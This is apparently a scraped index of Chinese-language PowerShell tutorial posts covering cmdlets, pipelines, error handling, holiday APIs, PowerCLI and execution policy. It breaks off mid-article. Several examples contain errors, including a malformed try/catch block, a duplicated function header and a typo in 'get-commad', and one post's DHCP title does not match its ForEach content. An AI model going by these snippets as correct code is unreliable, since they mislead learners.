技能连载 - Windows 系统的温度控制","text":"Windows 笔记本电脑（以及服务器）可能会变得很热，尤其是在夏天。令人惊讶的是，在 Windows 中没有简单的内置方法来监控温度传感器。了解机器有多热实际上非常重要，可以改善操作条件等方面带来巨大好处。例如，将笔记本电脑抬起并允许足够的空气进入通风口对它们非常有益。 这里有一个 PowerShell 模块，使温度监控变得非常简单： 1PS&gt; Install-Module -Name PSTemperatureMonitor 要从PowerShell Gallery安装此模块，您需要本地管理员权限，这是有道理的，因为无论如何您都需要本地管理员权限来读取硬件状态。 安装完模块后，请使用管理员权限启动PowerShell，然后启动温度监控，即每5秒刷新一次。 1234567891011121314PS&gt; Start-MonitorTemperature -Interval 5 | Format-Table -WrapWARNING: HardwareMonitor opened.Time CPU Core #1 CPU Core #2 CPU Core #3 CPU Core #4 CPU Package HDD Temperature Average---- ----------- ----------- ----------- ----------- ----------- --------------- -------12:17:31 65 69 66 65 69 53 6412:17:36 63 62 63 59 62 53 6012:17:41 62 59 59 59 62 53 5912:17:46 61 62 62 58 62 53 6012:17:51 70 68 63 63 70 53 6412:17:56 59 60 55 56 61 53 5712:18:02 60 60 57 61 61 53 5912:18:07 65 68 61 62 68 53 63WARNING: HardwareMonitor closed. 按下 CTRL+C 中止监控。更多详细信息请访问此处：https://github.com/TobiasPSP/PSTemperatureMonitor","link":"/2023/08/14/temperature-control-for-windows-systems/"},{"title":"PowerShell 技能连载 - 获取法国假期","text":"我看到了这篇博客文章，决定为法国发布这个。下面是一个获取所有法国假日的 PowerShell 函数： 12345678910111213141516171819202122232425function Get-FrenchHoliday{ param ( [int] $Year = (Get-Date).Year, [ValidateSet(&quot;alsace-moselle&quot;, &quot;guadeloupe&quot;, &quot;guyane&quot;, &quot;la-reunion&quot;, &quot;martinique&quot;, &quot;mayotte&quot;, &quot;metropole&quot;, &quot;nouvelle-caledonie&quot;, &quot;polynesie-francaise&quot;, &quot;saint-barthelemy&quot;, &quot;saint-martin&quot;, &quot;saint-pierre-et-miquelon&quot;, &quot;wallis-et-futuna&quot;)] [string] $Area = 'metropole', [switch] $NextOnly ) $url = &quot;https://calendrier.api.gouv.fr/jours-feries/$Area/$Year.json&quot; $holidays = Invoke-RestMethod -Uri $url -UseBasicParsing foreach ($obj in $holidays.PSObject.Properties) { if (-Not ($NextOnly.IsPresent) -or (((([DateTime]$obj.Name).Ticks) - (Get-Date).Ticks) -gt 0)) { Write-Host &quot;$($obj.Value) : $($obj.Name)&quot; } }} 运行上面的函数，然后运行这个命令： 1Get-FrenchHoliday 或者，提交额外的参数以获取特定地区的特定假日： 1Get-FrenchHoliday -NextOnly -Area guyane 1Get-FrenchHoliday -Area &quot;alsace-moselle&quot; -Year 2024","link":"/2023/08/24/get-french-holidays/"},{"title":"PowerShell 技能连载 - 获取德国节日","text":"这是一个PowerShell函数，可以获取所有德国的假日，无论是全国范围还是只针对你所在的州。 12345678910111213141516171819function Get-GermanHoliday{ param ( [int] $Year = (Get-Date).Year, [ValidateSet(&quot;BB&quot;,&quot;BE&quot;,&quot;BW&quot;,&quot;BY&quot;,&quot;HB&quot;,&quot;HE&quot;,&quot;HH&quot;,&quot;MV&quot;,&quot;NATIONAL&quot;, &quot;NI&quot;,&quot;NW&quot;,&quot;RP&quot;,&quot;SH&quot;,&quot;SL&quot;,&quot;SN&quot;,&quot;ST&quot;,&quot;TH&quot;)] [string] $State = 'NATIONAL' ) $url = &quot;https://feiertage-api.de/api/?jahr=$Year&quot; $holidays = Invoke-RestMethod -Uri $url -UseBasicParsing $holidays.$State} 运行上面的函数，然后直接运行原样的命令： 1234567891011PS&gt; Get-GermanHolidayNeujahrstag : @{datum=2023-01-01; hinweis=}Karfreitag : @{datum=2023-04-07; hinweis=}Ostermontag : @{datum=2023-04-10; hinweis=}Tag der Arbeit : @{datum=2023-05-01; hinweis=}Christi Himmelfahrt : @{datum=2023-05-18; hinweis=}Pfingstmontag : @{datum=2023-05-29; hinweis=}Tag der Deutschen Einheit : @{datum=2023-10-03; hinweis=}1. Weihnachtstag : @{datum=2023-12-25; hinweis=}2. Weihnachtstag : @{datum=2023-12-26; hinweis=} 或者，提交额外的参数以获取给定州的特定假日： 1PS&gt; Get-GermanHoliday -State ni -Year 2023 假设您想知道德国节日 “Christi Himmelfahrt” 的日期。以下是获取该信息的方法： 123456789# specify the name of the holiday to look up$holidayName = 'Christi Himmelfahrt'# get all holiday information$holidays = Get-GermanHoliday# get the particular holiday we are after, read the property &quot;datum&quot;# and convert the string ISO format to a real DateTime:$date = $holidays.$holidayName.datum -as [DateTime]$date","link":"/2023/08/10/get-german-holidays/"},{"title":"PowerShell 技能连载 - 寻找开始时间退化","text":"具有管理员权限的Windows系统可以访问在启动过程中收集到的诊断数据。Windows会记录每个服务和子系统的启动时间和降级时间（以毫秒为单位）。通过这些数据，您可以识别出需要花费过多时间来启动的服务可能存在的问题。 以下是一个脚本，它读取相应的日志文件条目并返回测量得到的启动时间： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#requires -RunAsAdmin$Days = 180$machineName = @{ Name = 'MachineName' Expression = { $env:COMPUTERNAME }}$FileName = @{ Name = 'FileName'; Expression = { $_.properties[2].value }}$Name = @{ Name = 'Name'; Expression = { $_.properties[4].value }}$Version = @{ Name = 'Version' Expression = { $_.properties[6].value }}$TotalTime = @{ Name = 'TotalTime' Expression = { $_.properties[7].value }}$DegradationTime = @{ Name = 'DegradationTime' Expression = { $_.properties[8].value }}Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Diagnostics-Performance/Operational' Id=101 StartTime = (Get-Date).AddDays(-$Days) Level = 1,2} | Select-Object -Property $MachineName, TimeCreated, $FileName, $Name, $Version, $TotalTime, $DegradationTime, Message | Out-GridView","link":"/2023/08/08/finding-start-time-degradation/"},{"title":"PowerShell 技能连载 - 7个用于管理DHCP的最佳PowerShell脚本","text":"最近，Foreach 和 Foreach-object 成为讨论的焦点，我们对此有所了解。循环是任何代码或脚本的核心，我们必须确保正确执行。但你是否想过哪种更适合在多台服务器上运行特定代码呢？让我们在这篇文章中探讨一下，并获取一些有用的知识。 对比：Foreach-object 和 Foreach当选择 invoke-command 和 where { } 时，Foreach 是其中一个备受关注的选项。 拥有 foreach 的优势在于可以将值存储在 Excel 中的一个字符串中，这是一个福音。同样，在选择 foreach () 时，我们有两个不同的选项，一个是 foreach 本身，另一个是 foreach-object。但当你看到对象时它们看起来很相似对吧。 我进行了测试以便能够挑选出胜者。 ForEach-Object 在通过管道发送数据时效果最佳，因为它会继续将对象流式传输到管道中的下一条命令中去。 Foreach-object 和 Foreach 之间的速度测试以下是测试代码：这将测试循环完成所需的实际时间。 123456789101112131415161718192021222324252627282930313233343536373839404142$a=Get-ChildItem –File C:\\users\\dhrub\\ -Recurse$time = (Measure-Command { $a | ForEach-Object { $_ }}).TotalMilliseconds [pscustomobject]@{ Type = 'ForEach-Object' Time_ms = $Time } $Time = (Measure-Command { ForEach ($i in ($a)) { $i }}).TotalMilliseconds [pscustomobject]@{ Type = 'ForEach' Time_ms = $Time } Output: Type Time_ms---- -------ForEach-Object 213.3006ForEach 64.8013 输出一定会让你大吃一惊！ 判决：该使用哪个？ForEach 语句在处理每个项目之前将所有项目提前加载到集合中。 ForEach-Object 预期通过管道流式传输项目，从而降低内存需求，但同时会影响性能。 Forach 总是比 Foreach-Object 更快，但这并不意味着你不能使用 **Foreach-Object。具体取决于工作的要求。","link":"/2023/06/15/Understanding-Foreach-and-Foreach-object-in-Powershell/"},{"title":"PowerShell 技能连载 - 学习在Powershell中使用管道的3种有效方法","text":"在Powershell中，管道是一个简单但有效的概念之一。在本教程中，我们将学习如何正确使用管道，并使我们的脚本在Powershell中整洁。 什么是管道？Windows Powershell通过管道运行命令。我们看到的每个命令行都是一个管道。一个管道可以包含一个或多个命令，多个命令用竖线字符“|”分隔。 命令从左到右执行，每个命令的输出被传送或传递给其后面的命令。管道中最后一个命令的输出就是显示在屏幕上的内容。 1234Get-Service #it is a single commad pipeline#Multicommand pipelines looks similarGet-Service| out-file servicelist.txt Get-Service |out-file servicelist.txt 没有显示任何输出，你知道为什么吗？ 嗯，它会直接将输出存储到管道后面提到的文本文件中。如果你理解了这一点，那么你就走在正确的道路上。 选择、排序和测量对象您必须已经理解了流水线的概念。现在让我们看看如何使用 select-object, sort-object, 和 measure-object 结合流水线。让我们通过一些示例来看看如何使用上述管道。 根据属性对对象进行排序 Sort-Object 可以重新对管道中的对象进行排序。 1Get-Service | Sort-Object Name Descending 类似地，您可以尝试在上面尝试 Ascending 并查看输出结果。 根据属性测量对象 Measure-Object 可以测量管道中的对象。我们需要添加 -Property 来指定单个数值属性。 在 -Property 后面，我们可以添加以下内容： 计算平均值用 -Average 显示最大值用 -Maximum 显示最小值用 -Minimum 显示总和用 -\\Sum 输出将是一个可度量或测量的对象而不是我们传入的任何东西。 让我们来检查一下您可以在自己电脑上尝试的几个示例。 1234567Get-Service | Measure-ObjectGet-process | Measure-Object2,0,5,6 | Measure-Object -Sum2,0,5,6 | Measure-Object -maximum 选择对象的子集 Select-object 完全没有智能，正如其名称所示，它用于选择。让我们看看它实际上在哪些地方使用以及如何在脚本中使用。 以下是可与 Select-Object 一起使用的一些参数。 -First 用于开始。 -Last 用于结束。 -Skip 在选择之前跳过若干行。 我们无法指定任何选择特定行的标准。让我们看看可以尝试在计算机上运行的一些示例。 123Get-Service | select-object -first 10Get-process | select-object -first 10 这是使用 Select-Object 或 Select 的一种方式，让我们看看另一种可以使用 Select-object 的方法。 1get-service |select-object -property Name -first 10 在上面的示例中，我们正在选择一个特定属性即已选取了 Name 并且还选取了前十个结果。同样地，我们可以尝试其他示例。 结论在本教程中，我们了解了 Powershell 中管道是什么、为什么要使用它以及如何使用它。 我们还学习了如何选择、排序和测量对象以及可以将其与示例结合应用的位置。 您可以尝试每个示例并确保您的计算机安装有 Powershell 。 让我们很快见到您，并希望您从今天学到了点东西。","link":"/2023/07/04/3-Proven-ways-to-Learn-Pipeline-in-Powershell/"},{"title":"PowerShell 技能连载 - 10个每个人都应该知道的有用PowerShell命令","text":"许多开发人员喜爱PowerShell，而且理由充分：它增强了Windows命令提示符，在那里我们中的许多人花费大量时间。然而，它确实有一个学习曲线，但一旦掌握了基本指令，对你来说将是生产力的绝佳工具。 Cmdlets 是 PowerShell 功能能力背后的驱动力。开发人员应该知道数十个关键命令，这些命令涵盖从改进通用 Windows 体验到对开发工作有用的指令。此列表编制为刚开始使用者提供便于参考的工具。 Get-Help对于任何使用 PowerShell 的人来说，Get-Help 命令至关重要，因为它提供即时访问所需信息以运行和操作所有可用命令。 以下是示例。 12Get-Help [[-Name] &lt;String&gt;] [-Path &lt;String&gt;] [-Category &lt;String[]&gt;] [-Component &lt;String[]&gt;][-Functionality &lt;String[]&gt;] [-Role &lt;String[]&gt;] [-Examples] [&lt;CommonParameters&gt;] Get-CommandGet-Command 是一个方便的参考 cmdlet，它显示当前会话中可访问的所有命令。 1get-command 输出内容类似这样: 12345CommandType Name Definition----------- ---- ----------Cmdlet Add-Content Add-Content [-Path] &lt;String[...Cmdlet Add-History Add-History [[-InputObject] ...Cmdlet Add-Member Add-Member [-MemberType] Set-ExecutionPolicy为防止恶意脚本在PowerShell环境中运行，微软默认禁用了脚本。然而，开发人员希望能够构建和运行脚本，因此Set-ExecutionPolicy命令允许您调整PowerShell脚本的安全级别。您可以选择四种不同的安全级别： Restricted: 这是默认的安全级别，阻止执行PowerShell脚本。在这个安全级别下只能交互式输入命令。 All Signed: 只有由可靠发布者签名的脚本才能运行在这个安全级别。 Remote Signed: 任何在本地生成的PowerShell脚本都可以在这个安全级别下运行。远程开发的脚本只有经过认可发布者签名后才被允许运行。 Unrestricted: 如其名称所示，无限制的安全级别从执行策略中移除所有限制，允许所有脚本运行。 Get-ExecutionPolicy类似地，在陌生环境工作时，该命令可以快速显示当前执行策略： Get-Service了解系统上已安装哪些服务也是很有益处的。通过以下命令，您可以快速获取这些数据： 1Get-Service 输出结果可能类似如下: 12345678Status Name DisplayName------ ---- -----------Running AarSvc_4f948d3 Agent Activation Runtime_4f948d3Running AdobeARMservice Adobe Acrobat Update ServiceStopped AJRouter AllJoyn Router ServiceStopped ALG Application Layer Gateway ServiceRunning AMD Crash Defen... AMD Crash Defender ServiceRunning AMD External Ev... AMD External Events Utility 如果您需要知道某个特定服务是否已安装，请在命令中添加“-Name”开关和服务的名称，Windows 将显示该服务的状态。还可以使用过滤功能返回当前安装的服务的指定子集。 Get-EventLogPowerShell 中的 Get-EventLog 命令可真正解析计算机事件日志。有许多可用选项。要阅读特定日志，请使用“-Log”开关后跟日志文件名。例如，要查看应用程序日志，请执行以下命令： 1Get-EventLog -Log &quot;Application&quot; Get-Eventlog 的其他参数是： -Verbose -Debug -ErrorAction -ErrorVariable -WarningAction -WarningVariable -OutBuffer -OutVariable Get-Process通常很方便能够快速获得当前正在运行的所有进程的列表，就像获取可用服务列表一样。 这些信息可以通过 Get-Process 命令获得。 1Get-Process 输出类似这样： 1234567Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 206 13 2696 4320 0.38 13684 6 AdobeIPCBroker 110 8 2008 4224 3816 0 amdfendrsr 371 16 5996 12548 2528 0 AppHelperCap 502 29 20728 14560 1.64 9688 6 ApplicationFrameHost 124 8 1556 2204 5372 0 armsvc Stop-ProcessStop-Process 可用于终止已冻结或不再响应的进程。如果不确定是什么导致了延迟，可以使用 Get-Process 快速发现问题进程。在获得名称或进程 ID 后，可以使用 Stop-Process 停止一个进程。以下是相同操作的示例： 1Stop-Process -processname armsvc Clear-History如果您希望删除所有命令历史记录条目怎么办？使用 Clear-History cmdlet 很简单。它也可以用来仅删除特定的命令。例如，以下命令将删除以“help”开头或以“command”结尾的命令： 1Clear-History -Command *help*, *command ConvertTo-html如果您需要提取数据以供报告或分发给他人，ConvertTo-HTML 是一种快速简便的方法。要使用它，请将另一个命令的输出传递给 ConvertTo-HTML 命令，并使用 -Property 开关指定您希望在 HTML 文件中包含哪些输出属性。您还需要为文件命名。 例如，以下代码创建了一个列出当前控制台中 PowerShell 命令的 HTML 页面： 1get-commad | convertto-html &gt; command.htm 结论以下 cmdlet 是我在日常工作中经常使用的一些特别提及，也被许多 PowerShell 开发人员广泛使用。请在评论部分告诉我这篇文章中遗漏了什么，以便我们可以在接下来的文章中涵盖它。","link":"/2023/08/10/10-Useful-Powershell-commands-that-everyone-should-know/"},{"title":"PowerShell 技能连载 - 理解PowerShell中的错误处理","text":"在编写代码时，错误管理是必须的。预期行为经常可以进行检查和验证。当发生意外情况时，我们使用异常处理。您可以轻松处理其他人代码抛出的异常，或者创建自己的异常供他人处理。 PowerShell 中的异常是什么？异常是一种事件类型，在标准错误处理无法解决问题时会被触发。尝试将一个数字除以零或耗尽内存都属于异常情况。当特定问题出现时，您正在使用其代码的创建者可能会创建异常。 PowerShell 中的 Throw、Try 和 Catch当发生异常时，我们称之为抛出了一个异常。您必须捕获抛出的异常才能对其进行管理。如果未通过任何方式捕获引发了一个未被捕获的异常，则脚本将停止运行。 同样地，我们有 Try 可以放置任何逻辑并使用 try 来捕获该异常。以下分别是 throw、try 和 catch 的一些示例。 我们使用 throw 关键字来生成自己的例外事件。 12345function hifunction hi{ throw &quot;hi all&quot;} 这会抛出一个运行时异常，这是一个致命错误。调用函数中的catch语句处理它，或者脚本以类似这样的通知离开。 12345678hihi allAt line:3 char:1+ throw &quot;hi all&quot;+ ~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (hi all:String) [], RuntimeException + FullyQualifiedErrorId : hi all 在PowerShell（以及许多其他语言中），异常处理的工作方式是首先尝试一部分代码，然后在它抛出错误时捕获它。这里有一个示例来说明我的意思。 12345678910111213141516function hi{throw &quot;hi all&quot; } try hi{catch{ Write-Output &quot;Something threw an exception&quot;}##Output:Something threw an exception PowerShell 中的 finally 块在 PowerShell 中的最终块 您并不总是需要处理错误，但无论是否发生异常，都需要一些代码来运行。这正是 finally 块所做的。finally 中的代码最终会被执行。 1234567891011121314151617181920212223242526function hi{throw &quot;hi all&quot; } try{ hi}catch{ Write-Output &quot;Something threw an exception&quot;}Finally{&quot;PowershellGuru&quot;}## Output ##Something threw an exceptionPowershellGuru Cmdlet -ErrorAction当您在任何高级函数或 cmdlet 中使用 -ErrorAction Stop 选项时，它会将所有 Write-Error 语句转换为终止错误，从而停止执行或可以被捕获。 类似地，我们有 -ErrorAction SilentlyContinue 选项，如果出现错误，则不显示错误并继续执行而不中断。 让我向您展示如何在脚本中使用这些。 1234567$ErrorActionPreference = &quot;Stop&quot;script-start'''script-end 我们可以使用“SilentlyContinue”来代替“Stop”。这样做的好处是我们不必在每一行都提到它所需的地方。 结论在本文中，我们已经介绍了异常、try/catch/throw/finally以及示例。此外，我们还看到了-ErrorAction cmdlets 以及如何实际使用它们。现在应该知道Powershell中异常处理的重要性了。让我们在下一篇文章中见面。","link":"/2023/08/20/Understanding-Error-handling-in-Powershell/"},{"title":"PowerShell 技能连载 - PowerShell函数的手把手指南","text":"为了在多个脚本中重复使用相同的代码，我们使用PowerShell函数。 PowerShell函数是一组已经被命名的PowerShell语句。每当我们想要运行一个函数时，我们需要输入它的名称。 函数可以像cmdlet一样具有参数。可以通过管道或命令行访问函数参数。它们返回一个值，该值可以赋给变量或作为命令行参数或函数参数传递。为了指定返回值，我们可以使用关键字return 函数语法以下是用于Function的语法。 12345678function [&lt;scope:&gt;]&lt;name&gt; [([type]$parameter1[,[type]$parameter2])]{ param([type]$parameter1 [,[type]$parameter2]) dynamicparam {&lt;statement list&gt;} begin {&lt;statement list&gt;} process {&lt;statement list&gt;} end {&lt;statement list&gt;}} 以上语法中包括以下术语： 一个函数关键短语 您选择的名称 功能范围（可选） 可以有任意数量的命名参数。 一个或多个 PowerShell 命令被大括号括起来。 函数示例： 123456789function Operation{ $num1 = 8 $num2 = 2 Write-Host &quot;Multiply : $($num1*$num2)&quot; Write-Host &quot;Addition : $($num1+$num2)&quot; Write-Host &quot;Subtraction : $($num1-$num2)&quot; Write-Host &quot;Divide : $($num1 / $num2)&quot;}Operation 结果： 1234Multiply : 16Addition : 10Subtraction : 6Divide : 4 函数范围 在 PowerShell 中，函数存在于创建它的范围内。 如果一个函数包含在脚本中，那么它只能在该脚本中的语句中使用。 当我们在全局范围指定一个函数时，我们可以在其他函数、脚本和命令中使用它。 PowerShell 中的高级功能高级功能是可以执行类似于 cmdlet 执行的操作的功能。当用户想要编写一个不必编写已编译 cmdlet 的函数时，他们可以使用这些功能。 使用已编译 cmdlet 和高级功能之间主要区别是已编译 cmdlet 是.NET Framework 类，必须用.NET Framework 语言编写。此外，高级功能是用 PowerShell 脚本语言编写的。 以下示例展示了如何使用 PowerShell 的高级功能： 12345678910111213141516function show-Message{ [CmdletBinding()] Param ( [ Parameter (Mandatory = $true)] [string] $Name ) Process { Write-Host (&quot;Hi $Name !&quot;) write-host $Name &quot;today is $(Get-Date)&quot; }}show-message 结果： 12345cmdlet show-Message at command pipeline position 1Supply values for the following parameters:Name: DhrubHi Dhrub !Dhrub today is 09/01/2021 13:41:12 结论我们在每种语言中都使用函数，通常会减少代码的行数。如果您的代码有1000行，那么借助函数的帮助，您可以将计数降至500。希望您喜欢这篇文章，我们下一篇文章再见。","link":"/2024/03/05/A-step-by-step-guide-for-function-in-Powershell/"},{"title":"PowerShell 技能连载 - PowerShell 过滤器：使用 Where-Object 和 Select-Object","text":"概述：Where-object 和 Select-object在学习如何使用 Where-Object 和 Select-Object 命令之前，理解前几节讨论的概念是至关重要的。首先，PowerShell 是一种面向对象的编程语言。几乎每个命令都会返回一个具有多个特征的对象，这些特征可以独立检查和过滤。 例如，Get-Process 命令将返回有关当前运行中的 Windows 进程的各种信息，如启动时间和当前内存使用情况。每个信息都保存为 Process 对象的属性。通过管道字符 | ，PowerShell 命令也可以链接在一起。当您这样做时，在管道左侧命令的结果将发送到右侧命令中。如果您将 Get-Process 管道到 Stop-Process（即 Get-Process | Stop-Process），则由 Get-Process 命令识别出来的进程将被停止。如果没有设置筛选条件，则此操作会尝试停止系统上所有正在运行中的进程。 Where-object：语法、工作原理和示例Where-object 命令可用于根据它们拥有任何属性来过滤对象。 1234567PS C:\\Users\\dhrub&gt; get-command Where-Object -SyntaxWhere-Object [-Property] &lt;string&gt; [[-Value] &lt;Object&gt;] [-InputObject &lt;psobject&gt;] [-EQ] [&lt;CommonParameters&gt;]Where-Object [-FilterScript] &lt;scriptblock&gt; [-InputObject &lt;psobject&gt;] [&lt;CommonParameters&gt;]Where-Object [-Property] &lt;string&gt; [[-Value] &lt;Object&gt;] -Match [-InputObject &lt;psobject&gt;] [&lt;CommonParameters&gt;] 最常用的语法是： 1Where-Object {$_.PropertyName -ComparisonType FilterValue} “PropertyName”属性是您正在过滤其属性的对象的名称。ComparisonType是描述您执行比较类型的简短关键字。“eq”代表等于，“gt”代表大于，“lt”代表小于，“like”代表通配符搜索。最后，FilterValue是与对象属性进行比较的值。Get-Process命令示例如下所示，并附有输出。 12345PS C:\\Users\\dhrub&gt; get-process| Where-Object {$_.processname -eq &quot;armsvc&quot;}Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 124 8 1588 2800 4956 0 armsvc Select-object: 语法、工作原理和示例Select-Object 命令是另一个需要熟悉的命令。该命令用于限制或修改其他命令的输出。它有许多应用程序，但其中最常见的一种是选择另一个命令的前 N 个结果。 12345678PS C:\\Users\\dhrub&gt; Get-Command Select-Object -SyntaxSelect-Object [[-Property] &lt;Object[]&gt;] [-InputObject &lt;psobject&gt;] [-ExcludeProperty &lt;string[]&gt;] [-ExpandProperty &lt;string&gt;] [-Unique] [-Last &lt;int&gt;] [-First &lt;int&gt;] [-Skip &lt;int&gt;] [-Wait] [&lt;CommonParameters&gt;]Select-Object [[-Property] &lt;Object[]&gt;] [-InputObject &lt;psobject&gt;] [-ExcludeProperty &lt;string[]&gt;] [-ExpandProperty &lt;string&gt;] [-Unique] [-SkipLast &lt;int&gt;] [&lt;CommonParameters&gt;]Select-Object [-InputObject &lt;psobject&gt;] [-Unique] [-Wait] [-Index &lt;int[]&gt;] [&lt;CommonParameters&gt;] 以下是我们可以过滤进程的一种方式。 12345678PS C:\\Users\\dhrub&gt; get-process |select NameName----AdobeIPCBrokeramdfendrsrAppHelperCapApplicationFrameHost 以下示例显示系统中正在运行的前五个进程。 123456789PS C:\\Users\\dhrub&gt; get-process |Select-Object -First 5Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 206 13 2428 10492 0.09 836 6 AdobeIPCBroker 110 8 2012 4612 3368 0 amdfendrsr 334 15 5692 9724 2284 0 AppHelperCap 394 22 15564 32088 0.30 13260 6 ApplicationFrameHost 124 8 1588 2800 4956 0 armsvc 以下示例显示系统中正在运行的最后五个进程。 123456789PS C:\\Users\\dhrub&gt; get-process |Select-Object -last 5Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1064 75 55192 2556 10.11 14596 6 WinStore.App 186 13 3380 8544 3856 0 WmiPrvSE 189 12 3900 11268 7532 0 WmiPrvSE 462 16 4900 8100 1288 0 WUDFHost 767 51 30048 17588 1.89 14588 6 YourPhone 结论在PowerShell中，您可以通过使用Where-Object和Select-Object命令轻松控制正在处理的项目。 您可以使用这些命令来过滤您查看的数据或将操作限制为与您设置的筛选器匹配的操作（例如停止服务或删除文件）。 这个系列将在下一篇文章中结束。 我们将研究如何循环遍历对象组以对一组项目执行更复杂的任务。","link":"/2024/09/09/Powershell-filter-Using-where-object-and-select-object/"},{"title":"PowerShell 技能连载 - 轻松掌握PowerShell中的ErrorAction","text":"PowerShell 是一种强大的脚本语言，允许用户轻松自动化任务和管理系统。PowerShell 的一个关键特性是 ErrorAction 参数，它允许用户控制脚本或命令中如何处理错误。 理解 PowerShell 中的 ErrorActionErrorAction 是一个参数，可用于任何 PowerShell 命令或脚本块，用于指定如何处理错误。可以为 ErrorAction 参数分配几个值，例如 Continue、SilentlyContinue、Stop 和 Inquire。 示例：使用 ErrorAction在 PowerShell 中，-ErrorAction 参数允许您指定如何处理特定命令或脚本的错误。您可以使用此参数与多个可能值，包括 Continue、SilentlyContinue、Stop 和 Inquire。以下是如何使用这些值的示例： Continue: 此选项告诉 PowerShell 在发生错误时继续执行脚本或命令，并显示错误消息后继续执行剩余代码。 1Get-ChildItem -Path “C:\\\\NonexistentFolder” -ErrorAction Continue** SilentlyContinue: 此选项告诉 PowerShell 抑制错误消息并继续执行脚本或命令。不会显示错误消息。 1Get-Item -Path “C:\\\\NonexistentFile” -ErrorAction SilentlyContinue** Stop: 此选项告诉 PowerShell 如果发生错误，则停止执行脚本或命令。它将终止该脚本并显示错误消息。 1Remove-Item -Path “C:\\\\ImportantFile” -ErrorAction Stop** Inquire：这个选项与其他选项有些不同。当发生错误时，它会提示用户输入，让他们决定是继续执行还是停止。通常与try和catch块一起用于交互式错误处理。 请注意，这些错误操作的实际行为可能会因您使用的特定 cmdlet 或脚本而异，因为并非所有 cmdlet 都支持所有错误操作首选项。但根据您的需求，在 PowerShell 中处理错误的常见方法如下。 使用 ErrorAction 的最佳实践在使用 ErrorAction 参数时，请记住以下一些最佳实践： 始终明确指定 ErrorAction 参数以确保一致的错误处理。 如果要确保捕获并显示任何错误，请考虑使用 Stop 值。 使用 Try-Catch-Finally 结构来处理特定错误并执行清理操作。 结论ErrorAction 参数是 PowerShell 中一个强大的工具，允许用户控制如何处理错误。通过了解如何使用此参数并遵循最佳实践，您可以编写更健壮和可靠的脚本。所以，在下次在 PowerShell 脚本中遇到错误时，请记得利用 ErrorAction 参数来优雅地处理它！","link":"/2023/11/01/Mastering-ErrorAction-in-PowerShell-Easily/"},{"title":"PowerShell 技能连载 - PowerCLI：管理VMware的简便方法","text":"简介踏上穿越 VMware 虚拟景观的迷人旅程可能是一项艰巨的任务。别害怕，亲爱的管理员们，PowerCLI 将改变您的 VMware 管理体验。作为多年来在这些虚拟领域中航行过的人，我将引导您了解 PowerShell 的复杂之处。 使用 PowerCLI 入门安装 PowerShell 模块在深入研究 PowerCLI 魔法之前，请确保已安装必要的模块。对于 VMware 管理，您需要安装 VMware PowerCLI 模块。使用以下 PowerShell 命令进行安装： Install-Module -Name VMware.PowerCLI -Force -AllowClobber 来源： PowerShell Gallery (powershellgallery.com) 此命令获取并安装 VMware PowerCLI 模块，这是管理虚拟环境所需的先决条件。 连接到您的 VMware 环境一旦模块被安装，您可以使用以下命令连接到您的 VMware 环境： Connect-VIServer -Server YourVMwareServer -User YourUsername -Password YourPassword 来源： VMware PowerCLI 文档 (code.vmware.com) 用实际服务器详细信息替换 “YourVMwareServer,” “YourUsername,” 和 “YourPassword” 。这将建立与您的 VMware 环境之间的连接。 PowerCLI：虚拟管理的交响乐VM概览的基本命令让我们从微软官方 PowerShell 文档中提取的一个基本命令开始： 1Get-VM 来源： 微软 PowerShell 文档 (docs.microsoft.com) 这个一行代码可以直接从 PowerShell 的圣典中为您提供 VMware 环境中所有虚拟机的全面列表。 使用 Where-Object 进行结果细化有时，您只需要特定信息。PowerShell 可以帮到你！使用 Where-Object 命令来过滤结果。例如，让我们找出具有超过 4 GB RAM 的 VM： Get-VM | Where-Object {$_.MemoryGB -gt 4} 来源： PowerShell.org 社区论坛 (powershell.org) 这段代码可帮助您识别具有超过 4 GB RAM 的 VM，这是从 PowerShell 社区汲取的智慧之源。 快照简化处理管理快照至关重要，而 VMware 官方文档提供了一个珍贵建议： Get-VM &quot;YourVMName&quot; | New-Snapshot -Name &quot;SnapshotName&quot; -Description &quot;SnapshotDescription&quot; 来源： VMware PowerCLI 文档 (code.vmware.com) 在此处，我们创建了一个带名称和描述的快照，遵循了 VMware 最佳实践。 使用 Set-VM 进行动态资源管理调整 VM 资源是一个强大功能，并且来自 VMware 的文档帮助我们掌握这种力量： Set-VM -Name &quot;YourVMName&quot; -MemoryGB 8 -NumCPU 2 来源： VMware PowerCLI 文档 (code.vmware.com) 这个一行代码展示了在 VMware 中使用 PowerShell CLI 实现无缝资源管理能力。 使用 Invoke-VMScript 在 VM 内运行命令要在 VM 内部执行命令，请参考 VMware 知识库: Invoke-VMScript -VM &quot;YourVMName&quot; -ScriptText &quot;YourScript&quot; -GuestCredential (Get-Credential) 此片段使您可以安全地在 VM 中运行脚本或命令。 结论当您开始使用PowerCLI在VMware中进行这段神奇的旅程时，请记住每个命令都是您虚拟魔法书中的一个咒语。本指南取自权威来源，只是您PowerShell冒险之旅的开端。定制、实验，并让魔法流淌在您的虚拟领域中。您的VMware管理即将变得不仅高效，而且真正迷人。祝编写脚本愉快！","link":"/2024/01/11/PowerCLI-The-Easy-Way-To-Manage-VMware/"},{"title":"PowerShell 技能连载 - 理解 PowerShell 执行策略：初学者指南","text":"PowerShell 是一种强大的脚本语言和自动化框架，被广泛应用于IT专业人员和系统管理员。PowerShell 的一个重要方面是 PowerShell 执行策略，它确定了在系统上运行脚本的安全级别。 如果您是 PowerShell 新手，可能已经遇到过像“set-executionpolicy”和“get-executionpolicy”这样的术语。在本博客文章中，我们将探讨这些命令的作用以及它们为何重要。 什么是 PowerShell 执行策略？执行策略是 PowerShell 中的一个安全功能，确定是否可以在系统上运行脚本。它有助于防止恶意脚本在用户不知情或未经同意的情况下被执行。 有不同级别的执行策略： Restricted：不允许运行任何脚本。这是默认设置。 AllSigned：只有由受信任发布者签名的脚本才能运行。 RemoteSigned：从互联网下载的脚本需要签名，但可以无需签名地运行本地脚本。 Unrestricted：任何脚本都可以无限制地运行。 设置 PowerShell 